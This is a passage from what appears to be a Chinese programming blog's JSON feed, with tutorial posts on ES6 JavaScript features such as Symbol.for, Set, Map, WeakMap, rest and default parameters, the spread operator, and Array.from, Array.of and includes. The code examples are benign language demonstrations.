类型的值，而是会先检查给定的key是否已经存在，如果不存在才会新建一个值。比如，如果你调用Symbol.for(&quot;cat&quot;)30 次，每次都会返回同一个 Symbol 值，但是调用Symbol(&quot;cat&quot;)30 次，会返回 30 个不同的 Symbol 值。12345Symbol.for(\"bar\") === Symbol.for(\"bar\")// trueSymbol(\"bar\") === Symbol(\"bar\")// false 上面代码中，由于Symbol()写法没有登记机制，所以每次调用都会返回一个不同的值。 Symbol.keyFor方法返回一个已登记的 Symbol 类型值的key。12345let s1 = Symbol.for(\"foo\");Symbol.keyFor(s1) // \"foo\"let s2 = Symbol(\"foo\");Symbol.keyFor(s2) // undefined 上面代码中，变量s2属于未登记的 Symbol 值，所以返回undefined。 需要注意的是，Symbol.for为 Symbol 值登记的名字，是全局环境的，可以在不同的 iframe 或 service worker 中取到同一个值。123456iframe = document.createElement('iframe');iframe.src = String(window.location);document.body.appendChild(iframe);iframe.contentWindow.Symbol.for('foo') === Symbol.for('foo')// true 上面代码中，iframe 窗口生成的 Symbol 值，可以在主页面得到。 总的来说，由于以symbol值作为名称的属性，不会被常规方法（for...in、for...of循环，也不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回）遍历得到。但是，它也不是私有属性，有一个Object.getOwnPropertySymbols方法，可以获取指定对象的所有 Symbol 属性名。我们可以利用这个特性，为对象定义一些非私有的、但又希望只用于内部的方法，这就是symbol的主要用法之一。 Set 和 MapSetES6 提供了新的数据结构 Set。它类似于数组，但是成员的值都是唯一的，没有重复的值。 Set 本身是一个构造函数，用来生成 Set 数据结构。12345678const s = new Set();[2, 3, 5, 4, 5, 2, 2].forEach(x =&gt; s.add(x));for (let i of s) &#123; console.log(i);&#125;// 2 3 5 4 上面代码通过add方法向 Set 结构加入成员，结果表明 Set 结构不会添加重复的值。 Set 函数可以接受一个数组（或者具有 iterable 接口的其他数据结构）作为参数，用来初始化。1234567891011121314151617181920212223242526// 例一const set = new Set([1, 2, 3, 4, 4]);[...set]// [1, 2, 3, 4]// 例二const items = new Set([1, 2, 3, 4, 5, 5, 5, 5]);items.size // 5// 例三function divs () &#123; return [...document.querySelectorAll('div')];&#125;const set = new Set(divs());set.size // 56// 类似于divs().forEach(div =&gt; set.add(div));set.size // 56上面代码中，例一和例二都是Set函数接受数组作为参数，例三是接受类似数组的对象作为参数。上面代码中，也展示了一种去除数组重复成员的方法。// 去除数组的重复成员[...new Set(array)] 向 Set 加入值的时候，不会发生类型转换，所以5和&quot;5&quot;是两个不同的值。Set 内部判断两个值是否不同，使用的算法叫做“Same-value equality”，它类似于精确相等运算符（===），主要的区别是NaN等于自身，而精确相等运算符认为NaN不等于自身。123456let set = new Set();let a = NaN;let b = NaN;set.add(a);set.add(b);set // Set &#123;NaN&#125; 上面代码向 Set 实例添加了两个NaN，但是只能加入一个。这表明，在 Set 内部，两个NaN是相等。 另外，两个对象总是不相等的。1234567let set = new Set();set.add(&#123;&#125;);set.size // 1set.add(&#123;&#125;);set.size // 2 上面代码表示，由于两个空对象不相等，所以它们被视为两个值。 Set 实例的属性和方法Set 结构的实例有以下属性。 Set.prototype.constructor：构造函数，默认就是Set函数。 Set.prototype.size：返回Set实例的成员总数。 Set 实例的方法分为两大类：操作方法（用于操作数据）和遍历方法（用于遍历成员）。下面是四个操作方法。 add(value)：添加某个值，返回 Set 结构本身。 delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 has(value)：返回一个布尔值，表示该值是否为Set的成员。 clear()：清除所有成员，没有返回值。 Array.from方法可以将 Set 结构转为数组。12const items = new Set([1, 2, 3, 4, 5]);const array = Array.from(items); 这就提供了去除数组重复成员的另一种方法。12345function dedupe(array) &#123; return Array.from(new Set(array));&#125;dedupe([1, 1, 2, 3]) // [1, 2, 3] Set 结构的实例有四个遍历方法，可以用于遍历成员。 keys()：返回键名的遍历器values()：返回键值的遍历器entries()：返回键值对的遍历器forEach()：使用回调函数遍历每个成员需要特别指出的是，Set的遍历顺序就是插入顺序。这个特性有时非常有用，比如使用 Set 保存一个回调函数列表，调用时就能保证按照添加顺序调用。扩展运算符（...）内部使用for...of循环，所以也可以用于 Set 结构。123let set = new Set(['red', 'green', 'blue']);let arr = [...set];// ['red', 'green', 'blue'] 扩展运算符和 Set 结构相结合，就可以去除数组的重复成员。123let arr = [3, 5, 2, 2, 5, 5];let unique = [...new Set(arr)];// [3, 5, 2] 而且，数组的map和filter方法也可以间接用于 Set 了。1234567let set = new Set([1, 2, 3]);set = new Set([...set].map(x =&gt; x * 2));// 返回Set结构：&#123;2, 4, 6&#125;let set = new Set([1, 2, 3, 4, 5]);set = new Set([...set].filter(x =&gt; (x % 2) == 0));// 返回Set结构：&#123;2, 4&#125; 因此使用 Set 可以很容易地实现并集（Union）、交集（Intersect）和差集（Difference）。1234567891011121314let a = new Set([1, 2, 3]);let b = new Set([4, 3, 2]);// 并集let union = new Set([...a, ...b]);// Set &#123;1, 2, 3, 4&#125;// 交集let intersect = new Set([...a].filter(x =&gt; b.has(x)));// set &#123;2, 3&#125;// 差集let difference = new Set([...a].filter(x =&gt; !b.has(x)));// Set &#123;1&#125; 如果想在遍历操作中，同步改变原来的 Set 结构，目前没有直接的方法，但有两种变通方法。一种是利用原 Set 结构映射出一个新的结构，然后赋值给原来的 Set 结构；另一种是利用Array.from方法。123456789// 方法一let set = new Set([1, 2, 3]);set = new Set([...set].map(val =&gt; val * 2));// set的值是2, 4, 6// 方法二let set = new Set([1, 2, 3]);set = new Set(Array.from(set, val =&gt; val * 2));// set的值是2, 4, 6 上面代码提供了两种方法，直接在遍历操作中改变原来的 Set 结构。 WeakSetWeakSet 结构与 Set 类似，也是不重复的值的集合。但是，它与 Set 有两个区别。 首先，WeakSet 的成员只能是对象，而不能是其他类型的值。12345const ws = new WeakSet();ws.add(1)// TypeError: Invalid value used in weak setws.add(Symbol())// TypeError: invalid value used in weak set 上面代码试图向 WeakSet 添加一个数值和Symbol值，结果报错，因为 WeakSet只能放置对象。 其次，WeakSet 中的对象都是弱引用，即垃圾回收机制不考虑 WeakSet 对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中。 这是因为垃圾回收机制依赖引用计数，如果一个值的引用次数不为0，垃圾回收机制就不会释放这块内存。结束使用该值之后，有时会忘记取消引用，导致内存无法释放，进而可能会引发内存泄漏。WeakSet 里面的引用，都不计入垃圾回收机制，所以就不存在这个问题。因此，WeakSet 适合临时存放一组对象，以及存放跟对象绑定的信息。只要这些对象在外部消失，它在 WeakSet 里面的引用就会自动消失。 由于上面这个特点，WeakSet 的成员是不适合引用的，因为它会随时消失。另外，由于 WeakSet 内部有多少个成员，取决于垃圾回收机制有没有运行，运行前后很可能成员个数是不一样的，而垃圾回收机制何时运行是不可预测的，因此 ES6 规定 WeakSet 不可遍历。 这些特点同样适用于本章后面要介绍的 WeakMap 结构。 WeakSet 的一个用处，是储存 DOM 节点，而不用担心这些节点从文档移除时，会引发内存泄漏。 MapJavaScript 的对象（Object），本质上是键值对的集合（Hash 结构），但是传统上只能用字符串当作键。这给它的使用带来了很大的限制。12345const data = &#123;&#125;;const element = document.getElementById('myDiv');data[element] = 'metadata';data['[object HTMLDivElement]'] // \"metadata\" 上面代码原意是将一个 DOM 节点作为对象data的键，但是由于对象只接受字符串作为键名，所以element被自动转为字符串[object HTMLDivElement]。 为了解决这个问题，ES6 提供了 Map 数据结构。它类似于对象，也是键值对的集合，但是“键”的范围不限于字符串，各种类型的值（包括对象）都可以当作键。也就是说，Object 结构提供了“字符串—值”的对应，Map 结构提供了“值—值”的对应，是一种更完善的 Hash 结构实现。如果你需要“键值对”的数据结构，Map 比 Object 更合适。123456789const m = new Map();const o = &#123;p: 'Hello World'&#125;;m.set(o, 'content')m.get(o) // \"content\"m.has(o) // truem.delete(o) // truem.has(o) // false 上面代码使用 Map 结构的set方法，将对象o当作m的一个键，然后又使用get方法读取这个键，接着使用delete方法删除了这个键。 上面的例子展示了如何向 Map 添加成员。作为构造函数，Map 也可以接受一个数组作为参数。该数组的成员是一个个表示键值对的数组。12345678910const map = new Map([ ['name', '张三'], ['title', 'Author']]);map.size // 2map.has('name') // truemap.get('name') // \"张三\"map.has('title') // truemap.get('title') // \"Author\" 上面代码在新建 Map 实例时，就指定了两个键name和title。 Map构造函数接受数组作为参数，实际上执行的是下面的算法。12345678910const items = [ ['name', '张三'], ['title', 'Author']];const map = new Map();items.forEach( ([key, value]) =&gt; map.set(key, value)); 事实上，不仅仅是数组，任何具有 Iterator 接口、且每个成员都是一个双元素的数组的数据结构都可以当作Map构造函数的参数。这就是说，Set和Map都可以用来生成新的 Map。12345678910const set = new Set([ ['foo', 1], ['bar', 2]]);const m1 = new Map(set);m1.get('foo') // 1const m2 = new Map([['baz', 3]]);const m3 = new Map(m2);m3.get('baz') // 3 上面代码中，我们分别使用 Set 对象和 Map 对象，当作Map构造函数的参数，结果都生成了新的 Map 对象。 如果对同一个键多次赋值，后面的值将覆盖前面的值。1234567const map = new Map();map.set(1, 'aaa').set(1, 'bbb');map.get(1) // \"bbb\" 上面代码对键1连续赋值两次，后一次的值覆盖前一次的值。 如果读取一个未知的键，则返回undefined。12new Map().get('asfddfsasadf')// undefined 注意，只有对同一个对象的引用，Map 结构才将其视为同一个键。这一点要非常小心。1234const map = new Map();map.set(['a'], 555);map.get(['a']) // undefined 上面代码的set和get方法，表面是针对同一个键，但实际上这是两个值，内存地址是不一样的，因此get方法无法读取该键，返回undefined。 同理，同样的值的两个实例，在 Map 结构中被视为两个键。1234567891011const map = new Map();const k1 = ['a'];const k2 = ['a'];map.set(k1, 111).set(k2, 222);map.get(k1) // 111map.get(k2) // 222 上面代码中，变量k1和k2的值是一样的，但是它们在 Map 结构中被视为两个键。 由上可知，Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键。这就解决了同名属性碰撞（clash）的问题，我们扩展别人的库的时候，如果使用对象作为键名，就不用担心自己的属性与原作者的属性同名。 如果 Map 的键是一个简单类型的值（数字、字符串、布尔值），则只要两个值严格相等，Map 将其视为一个键，比如0和-0就是一个键，布尔值true和字符串true则是两个不同的键。另外，undefined和null也是两个不同的键。虽然NaN不严格相等于自身，但 Map 将其视为同一个键。123456789101112131415let map = new Map();map.set(-0, 123);map.get(+0) // 123map.set(true, 1);map.set('true', 2);map.get(true) // 1map.set(undefined, 3);map.set(null, 4);map.get(undefined) // 3map.set(NaN, 123);map.get(NaN) // 123 Map实例的属性和操作方法Map 结构的实例有以下属性和操作方法。 size：size属性返回 Map 结构的成员总数。 set(key, value)：set方法设置键名key对应的键值为value，然后返回整个 Map 结构。如果key已经有值，则键值会被更新，否则就新生成该键。set方法返回的是当前的Map对象，因此可以采用链式写法。 get(key)：get方法读取key对应的键值，如果找不到key，返回undefined。 has(key)：has方法返回一个布尔值，表示某个键是否在当前 Map 对象之中。 delete(key)：delete方法删除某个键，返回true。如果删除失败，返回false。 clear()：clear方法清除所有成员，没有返回值。 Map遍历方法Map 结构原生提供三个遍历器生成函数和一个遍历方法。 keys()：返回键名的遍历器。 values()：返回键值的遍历器。 entries()：返回所有成员的遍历器。 forEach()：遍历 Map 的所有成员。 需要特别注意的是，Map 的遍历顺序就是插入顺序。Map 结构转为数组结构，比较快速的方法是使用扩展运算符（...）。1234567891011121314151617const map = new Map([ [1, 'one'], [2, 'two'], [3, 'three'],]);[...map.keys()]// [1, 2, 3][...map.values()]// ['one', 'two', 'three'][...map.entries()]// [[1,'one'], [2, 'two'], [3, 'three']][...map]// [[1,'one'], [2, 'two'], [3, 'three']] 结合数组的map方法、filter方法，可以实现 Map 的遍历和过滤（Map 本身没有map和filter方法）。1234567891011121314const map0 = new Map() .set(1, 'a') .set(2, 'b') .set(3, 'c');const map1 = new Map( [...map0].filter(([k, v]) =&gt; k &lt; 3));// 产生 Map 结构 &#123;1 =&gt; 'a', 2 =&gt; 'b'&#125;const map2 = new Map( [...map0].map(([k, v]) =&gt; [k * 2, '_' + v]) );// 产生 Map 结构 &#123;2 =&gt; '_a', 4 =&gt; '_b', 6 =&gt; '_c'&#125; 此外，Map 还有一个forEach方法，与数组的forEach方法类似，也可以实现遍历。1234567891011121314map.forEach(function(value, key, map) &#123; console.log(\"Key: %s, Value: %s\", key, value);&#125;);forEach方法还可以接受第二个参数，用来绑定this。const reporter = &#123; report: function(key, value) &#123; console.log(\"Key: %s, Value: %s\", key, value); &#125;&#125;;map.forEach(function(value, key, map) &#123; this.report(key, value);&#125;, reporter); 上面代码中，forEach方法的回调函数的this，就指向reporter。 Map与其他数据结构的互相转换（1）Map 转为数组 前面已经提过，Map 转为数组最方便的方法，就是使用扩展运算符（...）。12345const myMap = new Map() .set(true, 7) .set(&#123;foo: 3&#125;, ['abc']);[...myMap]// [ [ true, 7 ], [ &#123; foo: 3 &#125;, [ 'abc' ] ] ] （2）数组 转为 Map 将数组传入 Map 构造函数，就可以转为 Map。12345678new Map([ [true, 7], [&#123;foo: 3&#125;, ['abc']]])// Map &#123;// true =&gt; 7,// Object &#123;foo: 3&#125; =&gt; ['abc']// &#125; （3）Map 转为对象 如果所有 Map 的键都是字符串，它可以转为对象。12345678910111213function strMapToObj(strMap) &#123; let obj = Object.create(null); for (let [k,v] of strMap) &#123; obj[k] = v; &#125; return obj;&#125;const myMap = new Map() .set('yes', true) .set('no', false);strMapToObj(myMap)// &#123; yes: true, no: false &#125; （4）对象转为 Map12345678910function objToStrMap(obj) &#123; let strMap = new Map(); for (let k of Object.keys(obj)) &#123; strMap.set(k, obj[k]); &#125; return strMap;&#125;objToStrMap(&#123;yes: true, no: false&#125;)// Map &#123;\"yes\" =&gt; true, \"no\" =&gt; false&#125; （5）Map 转为 JSON Map 转为 JSON 要区分两种情况。一种情况是，Map 的键名都是字符串，这时可以选择转为对象 JSON。1234567function strMapToJson(strMap) &#123; return JSON.stringify(strMapToObj(strMap));&#125;let myMap = new Map().set('yes', true).set('no', false);strMapToJson(myMap)// '&#123;\"yes\":true,\"no\":false&#125;' 另一种情况是，Map 的键名有非字符串，这时可以选择转为数组 JSON。1234567function mapToArrayJson(map) &#123; return JSON.stringify([...map]);&#125;let myMap = new Map().set(true, 7).set(&#123;foo: 3&#125;, ['abc']);mapToArrayJson(myMap)// '[[true,7],[&#123;\"foo\":3&#125;,[\"abc\"]]]' （6）JSON 转为 Map JSON 转为 Map，正常情况下，所有键名都是字符串。123456function jsonToStrMap(jsonStr) &#123; return objToStrMap(JSON.parse(jsonStr));&#125;jsonToStrMap('&#123;\"yes\": true, \"no\": false&#125;')// Map &#123;'yes' =&gt; true, 'no' =&gt; false&#125; 但是，有一种特殊情况，整个 JSON 就是一个数组，且每个数组成员本身，又是一个有两个成员的数组。这时，它可以一一对应地转为 Map。这往往是 Map 转为数组 JSON 的逆操作。123456function jsonToMap(jsonStr) &#123; return new Map(JSON.parse(jsonStr));&#125;jsonToMap('[[true,7],[&#123;\"foo\":3&#125;,[\"abc\"]]]')// Map &#123;true =&gt; 7, Object &#123;foo: 3&#125; =&gt; ['abc']&#125; WeakMapWeakMap结构与Map结构类似，也是用于生成键值对的集合。WeakMap与Map的区别有两点。 首先，WeakMap只接受对象作为键名（null除外），不接受其他类型的值作为键名。其次，WeakMap的键名所指向的对象，不计入垃圾回收机制。 WeakMap的设计目的在于，有时我们想在某个对象上面存放一些数据，但是这会形成对于这个对象的引用。它的键名所引用的对象都是弱引用，即垃圾回收机制不将该引用考虑在内。因此，只要所引用的对象的其他引用都被清除，垃圾回收机制就会释放该对象所占用的内存。也就是说，一旦不再需要，WeakMap 里面的键名对象和所对应的键值对会自动消失，不用手动删除引用。 基本上，如果你要往对象上添加数据，又不想干扰垃圾回收机制，就可以使用 WeakMap。一个典型应用场景是，在网页的 DOM 元素上添加数据，就可以使用WeakMap结构。当该 DOM 元素被清除，其所对应的WeakMap记录就会自动被移除。123456const wm = new WeakMap();const element = document.getElementById('example');wm.set(element, 'some information');wm.get(element) // \"some information\" 上面代码中，先新建一个 Weakmap 实例。然后，将一个 DOM 节点作为键名存入该实例，并将一些附加信息作为键值，一起存放在 WeakMap 里面。这时，WeakMap 里面对element的引用就是弱引用，不会被计入垃圾回收机制。 也就是说，上面的 DOM 节点对象的引用计数是1，而不是2。这时，一旦消除对该节点的引用，它占用的内存就会被垃圾回收机制释放。Weakmap 保存的这个键值对，也会自动消失。 总之，WeakMap的专用场合就是，它的键所对应的对象，可能会在将来消失。WeakMap结构有助于防止内存泄漏。 注意，WeakMap 弱引用的只是键名，而不是键值。键值依然是正常引用。12345678const wm = new WeakMap();let key = &#123;&#125;;let obj = &#123;foo: 1&#125;;wm.set(key, obj);obj = null;wm.get(key)// Object &#123;foo: 1&#125; 上面代码中，键值obj是正常引用。所以，即使在 WeakMap 外部消除了obj的引用，WeakMap 内部的引用依然存在。 WeakMap 的语法WeakMap 与 Map 在 API 上的区别主要是两个，一是没有遍历操作（即没有key()、values()和entries()方法），也没有size属性。因为没有办法列出所有键名，某个键名是否存在完全不可预测，跟垃圾回收机制是否运行相关。这一刻可以取到键名，下一刻垃圾回收机制突然运行了，这个键名就没了，为了防止出现不确定性，就统一规定不能取到键名。二是无法清空，即不支持clear方法。因此，WeakMap只有四个方法可用：get()、set()、has()、delete()。 WeakMap 的用途前文说过，WeakMap 应用的典型场合就是 DOM 节点作为键名。下面是一个例子。123456789let myElement = document.getElementById('logo');let myWeakmap = new WeakMap();myWeakmap.set(myElement, &#123;timesClicked: 0&#125;);myElement.addEventListener('click', function() &#123; let logoData = myWeakmap.get(myElement); logoData.timesClicked++;&#125;, false); 上面代码中，myElement是一个 DOM 节点，每当发生click事件，就更新一下状态。我们将这个状态作为键值放在 WeakMap 里，对应的键名就是myElement。一旦这个 DOM 节点删除，该状态就会自动消失，不存在内存泄漏风险。 WeakMap 的另一个用处是部署私有属性。123456789101112131415161718192021222324const _counter = new WeakMap();const _action = new WeakMap();class Countdown &#123; constructor(counter, action) &#123; _counter.set(this, counter); _action.set(this, action); &#125; dec() &#123; let counter = _counter.get(this); if (counter &lt; 1) return; counter--; _counter.set(this, counter); if (counter === 0) &#123; _action.get(this)(); &#125; &#125;&#125;const c = new Countdown(2, () =&gt; console.log('DONE'));c.dec()c.dec()// DONE 上面代码中，Countdown类的两个内部属性_counter和_action，是实例的弱引用，所以如果删除实例，它们也就随之消失，不会造成内存泄漏。 参考：阮一峰《ECMAScript 6 入门》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript ES6一些有用的语法特性(函数的扩展、数组的扩展)","slug":"ES6（2）","date":"2018-02-07T02:20:54.000Z","updated":"2018-02-07T13:43:45.823Z","comments":true,"path":"2018/02/07/ES6（2）/","link":"","permalink":"https://recallhyx.github.io/2018/02/07/ES6（2）/","excerpt":"","text":"函数的扩展—默认值 和 rest 参数默认值ES6 允许为函数的参数设置默认值，即直接写在参数定义的后面。1234567function log(x, y = 'World') &#123; console.log(x, y);&#125;log('Hello') // Hello Worldlog('Hello', 'China') // Hello Chinalog('Hello', '') // Hello 参数变量是默认声明的，所以不能用let或const再次声明。1234function foo(x = 5) &#123; let x = 1; // error const x = 2; // error&#125; 上面代码中，参数变量x是默认声明的，在函数体中，不能用let或const再次声明，否则会报错。 使用参数默认值时，函数不能有同名参数。12345678910// 不报错function foo(x, x, y) &#123; // ...&#125;// 报错function foo(x, x, y = 1) &#123; // ...&#125;// SyntaxError: Duplicate parameter name not allowed in this context 另外，一个容易忽略的地方是，参数默认值不是传值的，而是每次都重新计算默认值表达式的值。也就是说，参数默认值是惰性求值的。123456789let x = 99;function foo(p = x + 1) &#123; console.log(p);&#125;foo() // 100x = 100;foo() // 101 上面代码中，参数p的默认值是x + 1。这时，每次调用函数foo，都会重新计算x + 1，而不是默认p等于 100。利用参数默认值，可以指定某一个参数不得省略，如果省略就抛出一个错误。12345678910function throwIfMissing() &#123; throw new Error('Missing parameter');&#125;function foo(mustBeProvided = throwIfMissing()) &#123; return mustBeProvided;&#125;foo()// Error: Missing parameter 上面代码的foo函数，如果调用的时候没有参数，就会调用默认值throwIfMissing函数，从而抛出一个错误。 从上面代码还可以看到，参数mustBeProvided的默认值等于throwIfMissing函数的运行结果（注意函数名throwIfMissing之后有一对圆括号），这表明参数的默认值不是在定义时执行，而是在运行时执行。如果参数已经赋值，默认值中的函数就不会运行。 另外，可以将参数默认值设为undefined，表明这个参数是可以省略的。1function foo(optional = undefined) &#123; ··· &#125; rest参数ES6 引入 rest 参数（形式为…变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。1234567891011function add(...values) &#123; let sum = 0; for (var val of values) &#123; sum += val; &#125; return sum;&#125;add(2, 5, 3) // 10 上面代码的add函数是一个求和函数，利用 rest 参数，可以向该函数传入任意数目的参数。 下面是一个 rest 参数代替arguments变量的例子。1234567// arguments变量的写法function sortNumbers() &#123; return Array.prototype.slice.call(arguments).sort();&#125;// rest参数的写法const sortNumbers = (...numbers) =&gt; numbers.sort(); 上面代码的两种写法，比较后可以发现，rest 参数的写法更自然也更简洁。 arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用Array.prototype.slice.call先将其转为数组。rest 参数就不存在这个问题，它就是一个真正的数组，数组特有的方法都可以使用。下面是一个利用 rest 参数改写数组push方法的例子。123456789function push(array, ...items) &#123; items.forEach(function(item) &#123; array.push(item); console.log(item); &#125;);&#125;var a = [];push(a, 1, 2, 3) 注意，rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。1234// 报错function f(a, ...b, c) &#123; // ...&#125; 函数的length属性，不包括 rest 参数。123(function(a) &#123;&#125;).length // 1(function(...a) &#123;&#125;).length // 0(function(a, ...b) &#123;&#125;).length // 1 数组的扩展—扩展运算符、Array.from()、Array.of() 和 数组实例的 entries()，keys() ，values() 和 includes()扩展运算符扩展运算符（spread）是三个点（…）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。1234567891011121314151617181920console.log(...[1, 2, 3])// 1 2 3console.log(1, ...[2, 3, 4], 5)// 1 2 3 4 5[...document.querySelectorAll('div')]// [&lt;div&gt;, &lt;div&gt;, &lt;div&gt;]该运算符主要用于函数调用。function push(array, ...items) &#123; array.push(...items);&#125;function add(x, y) &#123; return x + y;&#125;const numbers = [4, 38];add(...numbers) // 42 上面代码中，array.push(...items)和add(...numbers)这两行，都是函数的调用，它们的都使用了扩展运算符。该运算符将一个数组，变为参数序列。 扩展运算符与正常的函数参数可以结合使用，非常灵活。123function f(v, w, x, y, z) &#123; &#125;const args = [0, 1];f(-1, ...args, 2, ...[3]); 扩展运算符后面还可以放置表达式。1234const arr = [ ...(x &gt; 0 ? ['a'] : []), 'b',]; 如果扩展运算符后面是一个空数组，则不产生任何效果。12[...[], 1]// [1] Array.from()Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）。 下面是一个类似数组的对象，Array.from将它转为真正的数组。123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] 实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList集合，以及函数内部的arguments对象。Array.from都可以将它们转为真正的数组。1234567891011// NodeList对象let ps = document.querySelectorAll('p');Array.from(ps).filter(p =&gt; &#123; return p.textContent.length &gt; 100;&#125;);// arguments对象function foo() &#123; var args = Array.from(arguments); // ...&#125; 上面代码中，querySelectorAll方法返回的是一个类似数组的对象，可以将这个对象转为真正的数组，再使用forEach方法。 只要是部署了 Iterator 接口的数据结构，Array.from都能将其转为数组。12345Array.from('hello')// ['h', 'e', 'l', 'l', 'o']let namesSet = new Set(['a', 'b'])Array.from(namesSet) // ['a', 'b'] 上面代码中，字符串和 Set 结构都具有 Iterator 接口，因此可以被Array.from转为真正的数组。 如果参数是一个真正的数组，Array.from会返回一个一模一样的新数组。12Array.from([1, 2, 3])// [1, 2, 3] 值得提醒的是，扩展运算符（...）也可以将某些数据结构转为数组。1234567// arguments对象function foo() &#123; const args = [...arguments];&#125;// NodeList对象[...document.querySelectorAll('div')] 扩展运算符背后调用的是遍历器接口（Symbol.iterator），如果一个对象没有部署这个接口，就无法转换。Array.from方法还支持类似数组的对象。所谓类似数组的对象，本质特征只有一点，即必须有length属性。因此，任何有length属性的对象，都可以通过Array.from方法转为数组，而此时扩展运算符就无法转换。12Array.from(&#123; length: 3 &#125;);// [ undefined, undefined, undefined ] 上面代码中，Array.from返回了一个具有三个成员的数组，每个位置的值都是undefined。扩展运算符转换不了这个对象。 对于还没有部署该方法的浏览器，可以用Array.prototype.slice方法替代。123const toArray = (() =&gt; Array.from ? Array.from : obj =&gt; [].slice.call(obj))(); Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。123456Array.from(arrayLike, x =&gt; x * x);// 等同于Array.from(arrayLike).map(x =&gt; x * x);Array.from([1, 2, 3], (x) =&gt; x * x)// [1, 4, 9] 下面的例子是取出一组 DOM 节点的文本内容。1234567let spans = document.querySelectorAll('span.name');// map()let names1 = Array.prototype.map.call(spans, s =&gt; s.textContent);// Array.from()let names2 = Array.from(spans, s =&gt; s.textContent) 下面的例子将数组中布尔值为false的成员转为0。12Array.from([1, , 2, , 3], (n) =&gt; n || 0)// [1, 0, 2, 0, 3] 另一个例子是返回各种数据的类型。12345function typesOf () &#123; return Array.from(arguments, value =&gt; typeof value)&#125;typesOf(null, [], NaN)// ['object', 'object', 'number'] 如果map函数里面用到了this关键字，还可以传入Array.from的第三个参数，用来绑定this。 Array.from()可以将各种值转为真正的数组，并且还提供map功能。这实际上意味着，只要有一个原始的数据结构，你就可以先对它的值进行处理，然后转成规范的数组结构，进而就可以使用数量众多的数组方法。12Array.from(&#123; length: 2 &#125;, () =&gt; 'jack')// ['jack', 'jack'] 上面代码中，Array.from的第一个参数指定了第二个参数运行的次数。这种特性可以让该方法的用法变得非常灵活。 Array.from()的另一个应用是，将字符串转为数组，然后返回字符串的长度。因为它能正确处理各种 Unicode 字符，可以避免 JavaScript 将大于\\uFFFF的 Unicode 字符，算作两个字符的 bug。123function countSymbols(string) &#123; return Array.from(string).length;&#125; Array.of()Array.of方法用于将一组值，转换为数组。123Array.of(3, 11, 8) // [3,11,8]Array.of(3) // [3]Array.of(3).length // 1 这个方法的主要目的，是弥补数组构造函数Array()的不足。因为参数个数的不同，会导致Array()的行为有差异。123Array() // []Array(3) // [, , ,]Array(3, 11, 8) // [3, 11, 8] 上面代码中，Array方法没有参数、一个参数、三个参数时，返回结果都不一样。只有当参数个数不少于 2 个时，Array()才会返回由参数组成的新数组。参数个数只有一个时，实际上是指定数组的长度。 Array.of基本上可以用来替代Array()或new Array()，并且不存在由于参数不同而导致的重载。它的行为非常统一。1234Array.of() // []Array.of(undefined) // [undefined]Array.of(1) // [1]Array.of(1, 2) // [1, 2] Array.of总是返回参数值组成的数组。如果没有参数，就返回一个空数组。 Array.of方法可以用下面的代码模拟实现。123function ArrayOf()&#123; return [].slice.call(arguments);&#125; 数组实例的 entries()，keys() ，values()ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组。它们都返回一个遍历器对象，可以用for...of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。1234567891011121314151617for (let index of ['a', 'b'].keys()) &#123; console.log(index);&#125;// 0// 1for (let elem of ['a', 'b'].values()) &#123; console.log(elem);&#125;// 'a'// 'b'for (let [index, elem] of ['a', 'b'].entries()) &#123; console.log(index, elem);&#125;// 0 \"a\"// 1 \"b\" 如果不使用for...of循环，可以手动调用遍历器对象的next方法，进行遍历。12345let letter = ['a', 'b', 'c'];let entries = letter.entries();console.log(entries.next().value); // [0, 'a']console.log(entries.next().value); // [1, 'b']console.log(entries.next().value); // [2, 'c'] 数组实例的 includes()Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。ES2016 引入了该方法。123[1, 2, 3].includes(2) // true[1, 2, 3].includes(4) // false[1, 2, NaN].includes(NaN) // true 该方法的第二个参数表示搜索的起始位置，默认为0。如果第二个参数为负数，则表示倒数的位置，如果这时它大于数组长度（比如第二个参数为-4，但数组长度为3），则会重置为从0开始。12[1, 2, 3].includes(3, 3); // false[1, 2, 3].includes(3, -1); // true 没有该方法之前，我们通常使用数组的indexOf方法，检查是否包含某个值。123if (arr.indexOf(el) !== -1) &#123; // ...&#125; indexOf方法有两个缺点，一是不够语义化，它的含义是找到参数值的第一个出现位置，所以要去比较是否不等于-1，表达起来不够直观。二是，它内部使用严格相等运算符（===）进行判断，这会导致对NaN的误判。12[NaN].indexOf(NaN)// -1 includes使用的是不一样的判断算法，就没有这个问题。12[NaN].includes(NaN)// true 下面代码用来检查当前环境是否支持该方法，如果不支持，部署一个简易的替代版本。123456const contains = (() =&gt; Array.prototype.includes ? (arr, value) =&gt; arr.includes(value) : (arr, value) =&gt; arr.some(el =&gt; el === value))();contains(['foo', 'bar'], 'baz'); // =&gt; false 另外，Map 和 Set 数据结构有一个has方法，需要注意与includes区分。 Map 结构的has方法，是用来查找键名的，比如Map.prototype.has(key)、WeakMap.prototype.has(key)、Reflect.has(target, propertyKey)。Set结构的has方法，是用来查找值的，比如Set.prototype.has(value)、WeakSet.prototype.has(value)。 参考：阮一峰《ECMAScript 6 